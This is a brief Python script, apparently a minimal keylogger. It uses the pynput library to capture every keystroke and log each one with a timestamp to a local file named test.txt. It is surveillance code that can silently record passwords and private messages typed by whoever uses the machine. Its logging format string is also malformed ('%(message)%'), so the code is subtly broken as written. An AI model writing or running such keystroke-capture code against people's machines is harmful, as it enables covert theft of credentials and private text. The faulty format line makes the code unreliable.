from pynput.keyboard import Listener
import logging
file = "test.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)%")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()    